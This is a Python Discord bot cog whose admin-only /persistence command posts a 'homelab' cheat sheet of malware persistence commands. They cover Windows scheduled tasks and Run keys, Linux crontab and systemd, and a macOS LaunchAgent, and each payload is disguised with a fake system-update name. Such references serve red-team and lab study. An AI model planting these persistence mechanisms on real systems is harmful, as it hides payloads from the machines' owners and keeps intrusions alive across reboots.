import os
import discord
from discord.ext import commands
from discord import app_commands

from cogs.utils.notification_msg import NotificationMsg

ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
 
class Persistence(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="persistence", description="Persistence cheatsheet")
    async def persistence_cheatsheet(self, interaction: discord.Interaction):
        # Admin Check
        if interaction.user.id != ADMIN_ID:
            embed = NotificationMsg.error_msg(
                title="Permission Denied",
                description="You don't have permission to manage persistence."
            )

            return await interaction.response.send_message(embed=embed, ephemeral=True)

        embed = discord.Embed(
            title="🛡️ Persistence Cheat Sheet (Homelab Edition)",
            description="Sample commands for persisting payloads across operating systems.\n*Note: Replace `/path/to/payload` before running.*",
            color=0xFF0000,
        )

        windows_cmds = (
            "**Method 1: Scheduled Task (runs at logon)**\n"
            "```cmd\n"
            "schtasks /create /tn \"WindowsUpdateCore\" /tr \"C:\\path\\to\\payload.exe\" /sc onlogon\n"
            "```\n"
            "**Method 2: Registry Run Key (starts with the system)**\n"
            "```cmd\n"
            "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WinUpdate\" /t REG_SZ /d \"C:\\path\\to\\payload.exe\" /f\n"
            "```"
        )
        embed.add_field(name="🪟 WINDOWS", value=windows_cmds, inline=False)

        linux_cmds = (
            "**Method 1: Crontab (runs after reboot)**\n"
            "```bash\n"
            "(crontab -l 2>/dev/null; echo \"@reboot /path/to/payload &\") | crontab -\n"
            "```\n"
            "**Method 2: Systemd Service (requires root)**\n"
            "```bash\n"
            "echo -e '[Unit]\\nDescription=System Update\\n[Service]\\nExecStart=/path/to/payload\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/sysupdate.service\n"
            "systemctl enable --now sysupdate.service\n"
            "```"
        )
        embed.add_field(name="🐧 LINUX", value=linux_cmds, inline=False)

        mac_cmds = (
            "**Using LaunchAgent (runs in the background per user)**\n"
            "```bash\n"
            "echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"[http://www.apple.com/DTDs/PropertyList-1.0.dtd](http://www.apple.com/DTDs/PropertyList-1.0.dtd)\">\n"
            "<plist version=\"1.0\">\n"
            "<dict>\n"
            "  <key>Label</key><string>com.apple.update.agent</string>\n"
            "  <key>ProgramArguments</key>\n"
            "  <array>\n"
            "    <string>/path/to/payload</string>\n"
            "  </array>\n"
            "  <key>RunAtLoad</key><true/>\n"
            "</dict>\n"
            "</plist>' > ~/Library/LaunchAgents/com.apple.update.agent.plist\n"
            "launchctl load ~/Library/LaunchAgents/com.apple.update.agent.plist\n"
            "```"
        )
        embed.add_field(name="🍏 MACOS", value=mac_cmds, inline=False)

        await interaction.response.send_message(embed=embed)


async def setup(bot):
    await bot.add_cog(Persistence(bot))
